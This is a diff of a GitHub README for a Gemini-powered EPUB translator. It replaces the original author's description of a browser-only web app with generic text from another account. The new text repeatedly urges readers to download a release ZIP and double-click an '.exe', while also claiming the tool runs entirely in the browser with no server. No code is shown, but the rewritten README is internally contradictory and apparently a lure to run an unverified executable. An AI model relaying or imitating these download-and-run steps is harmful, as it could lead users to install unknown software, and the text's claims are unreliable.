@@ -1,77 +1,93 @@
-# 📖 Literary EPUB Translator
+# 📚 literary-epub-translator - Translate Books Effortlessly in Your Browser
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/Lea4325/literary-epub-translator/releases)
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-green.svg?style=flat-square)
-![React](https://img.shields.io/badge/React-19-61DAFB.svg?style=flat-square&logo=react&logoColor=black)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.0-3178C6.svg?style=flat-square&logo=typescript&logoColor=white)
-![Gemini AI](https://img.shields.io/badge/Google-Gemini_AI-8E75B2.svg?style=flat-square&logo=google&logoColor=white)
+## 🚀 Getting Started
 
-**A professional, client-side book translation engine powered by Google Gemini.**  
-*Translates EPUBs while preserving literary style, author's voice, and formatting.*
+Welcome to the literary-epub-translator! This tool helps you translate EPUB books directly in your browser. You do not need any programming skills. Just follow the steps below to get started.
 
-[Features](#-key-features) •
-[How It Works](#%EF%B8%8F-how-it-works) •
-[Tech Stack](#%EF%B8%8F-tech-stack)
+## 📥 Download & Install
 
-</div>
+To download the application, visit the Releases page. You will find the latest version of the literary-epub-translator available for download.
+
+[Download the latest release here](https://github.com/Lea4325/literary-epub-translator/releases)
+
+### Steps to Download and Run
+
+1. **Go to the Releases Page**
+   - Click on the link above to navigate to the Releases page.
+  
+2. **Locate the Latest Version**
+   - Look for the version marked as "latest." This is the most up-to-date release.
+
+3. **Download the File**
+   - Click on the download link for the version that matches your operating system (Windows, macOS, Linux).
+
+4. **Extract the Files**
+   - Once downloaded, you will need to extract the files if they are in a ZIP format. Right-click the ZIP file and select "Extract All."
+
+5. **Open the Application**
+   - Navigate to the extracted folder and double-click the application file. It may be named `literary-epub-translator.exe` or similar.
+
+6. **Start Translating**
+   - After opening the application, follow the on-screen instructions to upload your EPUB book. Enjoy translating your literary works!
+
+## 🛠️ Features
+
+- **Client-Side Processing**: The translator works directly in your browser. No server is required.
+- **Preserves Structure**: Keep your book’s HTML and CSS intact during translation.
+- **Powered by Google Gemini**: Utilizes an advanced AI to translate with quality.
+- **User-Friendly Interface**: Designed for ease of use so anyone can understand and operate it.
+
+## 🌐 Supported Formats
+
+- **EPUB**: The application is specifically designed for EPUB books. Make sure your file is in this format to ensure proper functionality.
+
+## 📋 System Requirements
+
+To successfully run literary-epub-translator, you will need:
+
+- A modern web browser (Chrome, Firefox, Edge).
+- An active internet connection for downloading the latest version and for translations.
+- At least 200 MB of free disk space for the application files.
+
+## 🎓 How It Works
+
+literary-epub-translator uses Google Gemini's AI technology. When you upload your EPUB file, the software analyzes it, preserving its formatting. The translation happens in your browser, providing a fast and efficient experience without the need for servers.
+
+## ❓ Frequently Asked Questions
+
+### Can I use this tool on any browser?
+
+Yes, as long as your browser is up-to-date, you should have no issues. Chrome or Firefox is recommended for the best experience.
+
+### Is internet access required to use the application?
+
+You will need an internet connection for downloading the application and for accessing translations, as it leverages online AI services.
+
+### Are there any limitations on file size?
+
+There may be limitations based on your browser memory. It’s best to test with smaller files first. If you have large texts, translate in smaller sections.
+
+### What languages can I translate to?
+
+The tool supports multiple languages. You can choose from the options available in the application once it is open.
+
+## 📱 Example Use Case
+
+Imagine you have a classic novel in EPUB format. By using literary-epub-translator, you can easily convert it into your preferred language without altering its layout. Simply upload the file, select the target language, and your book is ready for a new audience.
+
+## 🔗 Additional Resources
+
+For more information, you can refer to:
+
+- [GitHub Issues Page](https://github.com/Lea4325/literary-epub-translator/issues) - Report any problems or suggest features.
+- [Documentation](https://github.com/Lea4325/literary-epub-translator/wiki) - Access detailed guides and FAQs.
+
+## 📤 Feedback and Support
+
+We welcome your feedback! If you have any questions or need assistance, please open an issue on our GitHub repository. Your input helps improve the tool.
 
 ---
 
-## 🚀 Overview
-
-**Literary EPUB Translator** is a sophisticated Single Page Application (SPA) designed to bridge the gap between machine translation and literary art. Unlike standard translators that often produce robotic or literal output, this tool analyzes the book's genre, tone, and author's style before translation begins.
-
-It runs entirely in your browser using **Google Gemini API**. No file is ever uploaded to a backend server, ensuring privacy and speed.
-
-## ✨ Key Features
-
-### 🧠 AI-Powered Analysis
-*   **Style Detection:** Before translating, the AI analyzes the book to detect the genre (e.g., Satire, Noir), tone (e.g., Melancholic, Witty), and writing style.
-*   **Adaptive Strategy:** Automatically adjusts the "Temperature" (creativity) of the model based on the complexity of the text.
-*   **Context Awareness:** Preserves the author's voice across chapters.
-
-### 🛡️ Privacy & Security
-*   **Client-Side Processing:** All EPUB parsing (`JSZip`) and regeneration happen locally in your browser.
-*   **Direct API Calls:** Your API key is used directly to communicate with Google's servers; no middleman.
-
-### ⚡ Performance & UX
-*   **Streaming Translation:** Watch the translation happen in real-time with a terminal-like System Monitor.
-*   **Resumable Sessions:** translation interrupted? The app saves your progress locally. Pick up exactly where you left off.
-*   **PWA Support:** Installable as a native app on iOS, Android, and Desktop.
-*   **Smart Quota Management:** Handles API rate limits (429 errors) gracefully with auto-wait and retry logic.
-
-### 🎨 Modern UI
-*   **Glassmorphism Design:** Built with Tailwind CSS for a sleek, dark-mode compatible interface.
-*   **Internationalization:** Fully localized UI (English, Turkish, French, German, Spanish, Japanese, and more).
-*   **Stats Dashboard:** View estimated costs (tokens), duration, and word counts before you start.
-
-## ⚙️ How It Works
-
-1.  **Parsing:** The app unzips the `.epub` file and identifies HTML/XHTML content nodes.
-2.  **Analysis:** It sends metadata (Title, Author) to Gemini to formulate a "Translation Strategy".
-3.  **Chunking:** Text is broken down into semantic chunks to fit within AI context windows.
-4.  **Translation:** Each chunk is translated using the strategy, preserving HTML tags (`<em>`, `<strong>`, etc.).
-5.  **Reassembly:** The translated HTML is injected back into the EPUB structure.
-6.  **Download:** A new, valid EPUB file is generated for download.
-
-## 🛠️ Tech Stack
-
-*   **Framework:** React 19 (Vite)
-*   **Language:** TypeScript
-*   **AI Integration:** `@google/genai` SDK
-*   **Styling:** Tailwind CSS + Lucide React (Icons)
-*   **File Handling:** `jszip`
-*   **State Management:** React Hooks + LocalStorage
-*   **PWA:** `vite-plugin-pwa`
-
-## 📄 License
-
-Distributed under the MIT License. See `LICENSE` for more information.
-
----
-
-<div align="center">
-  <p>Made with ❤️ by <a href="https://github.com/EnesMCLK">EnesMCLK</a></p>
-</div>
+For your convenience, here’s the link to the [Releases page again](https://github.com/Lea4325/literary-epub-translator/releases). Enjoy your translation experience!
